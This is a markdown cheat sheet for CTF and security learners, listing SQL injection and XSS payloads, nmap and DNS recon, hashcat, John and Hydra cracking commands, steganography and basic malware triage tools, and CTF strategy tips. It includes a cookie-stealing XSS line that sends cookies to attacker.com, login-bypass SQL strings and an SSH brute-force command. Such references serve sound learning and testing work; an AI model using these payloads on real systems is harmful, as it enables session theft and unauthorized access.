# ⚡ Cybersecurity Cheat Sheet

A practical reference for common commands, payloads, attack techniques, and strategies used in cybersecurity.

---

# 🌐 Web Security

## 💉 SQL Injection

### Authentication Bypass
```sql
' OR 1=1 --
' OR '1'='1' --
admin' --
```

### Union-Based Injection
```sql
' UNION SELECT NULL,NULL --
' UNION SELECT username,password FROM users --
```

### Blind SQL Injection
```sql
' AND 1=1 --
' AND 1=2 --
```

---

## ⚡ XSS (Cross-Site Scripting)

### Basic Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

### Advanced Payloads
```html
<svg onload=alert(1)>
<input onfocus=alert(1)>
```

### Cookie Stealing
```html
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

---

# 📡 Reconnaissance & Enumeration

## 🔍 Nmap

### Basic Scan
```bash
nmap target-ip
```

### Service Detection
```bash
nmap -sV target-ip
```

### Aggressive Scan
```bash
nmap -A target-ip
```

### Full Port Scan
```bash
nmap -p- target-ip
```

---

## 🌐 DNS Enumeration

```bash
nslookup example.com
dig example.com
host example.com
```

### Subdomain Enumeration
```bash
theHarvester -d example.com -b google
```

---

## 📜 WHOIS

```bash
whois example.com
```

---

# 🔐 Password Cracking

## 🔥 Hashcat

```bash
hashcat -m 0 hash.txt rockyou.txt
```

### Hash Modes
- `-m 0` → MD5  
- `-m 100` → SHA1  
- `-m 1800` → SHA512  

---

## 🔥 Advanced Hashcat

```bash
hashcat -m 0 hash.txt rockyou.txt -r rules/best64.rule
```

---

## 🔥 John the Ripper

```bash
john hash.txt
john --show hash.txt
```

---

## 🌐 Hydra

```bash
hydra -l admin -P passwords.txt ssh://target-ip
```

---

# 🧪 Steganography

## Extract Hidden Data
```bash
steghide extract -sf image.jpg
```

## Analyze Files
```bash
zsteg image.png
binwalk image.png
```

## Metadata Analysis
```bash
exiftool image.jpg
```

---

# 🧪 Malware Analysis (Basic)

## File Inspection
```bash
strings file.exe
file file.exe
```

## Hash Calculation
```bash
md5sum file.exe
sha256sum file.exe
```

## Process Monitoring
```bash
ps aux
top
```

---

# 🛠️ Web Testing (Burp Suite)

## Key Uses
- Intercept HTTP requests
- Modify parameters
- Test vulnerabilities

---

# 🧩 Beginner vs Advanced Commands

## 🟢 Beginner

```bash
nmap target-ip
nslookup example.com
hashcat -m 0 hash.txt rockyou.txt
```

```html
<script>alert(1)</script>
```

---

## 🔴 Advanced

```bash
nmap -A -T4 target-ip
nmap -p- target-ip
sqlmap -u "http://target.com?id=1" --dbs
```

```bash
hashcat -m 0 hash.txt rockyou.txt -r rules/best64.rule
theHarvester -d example.com -b google,bing
```

---

# ⚠️ Common Mistakes

- Skipping reconnaissance phase  
- Relying only on automated tools  
- Not testing all input fields  
- Using only basic payloads  
- Ignoring output responses  
- Forgetting mitigation techniques  

---

# 🎯 CTF Tips & Strategy

## 🧠 Approach
- Understand problem statement
- Identify category
- Start simple

---

## 🔍 Analysis
- Look for patterns
- Check encodings
- Analyze inputs/outputs

---

## 🔧 Tools
- Web → Burp Suite  
- Network → Wireshark  
- Crypto → CyberChef  

---

## ⚔️ Strategy
- Break problem into parts  
- Try multiple approaches  
- Don’t overthink initially  

---

## ⏱️ Time Management
- Skip difficult problems temporarily  
- Return with fresh perspective  

---

## 🧠 Mindset
- Think like an attacker  
- Focus on logic, not tools  

---

# 🧾 Final Tip

👉 Tools don’t make you good — **understanding does**  
👉 Always focus on **logic over automation**

---

# ⚠️ Disclaimer

This cheat sheet is for **educational purposes only**.  
Use only in authorized environments.
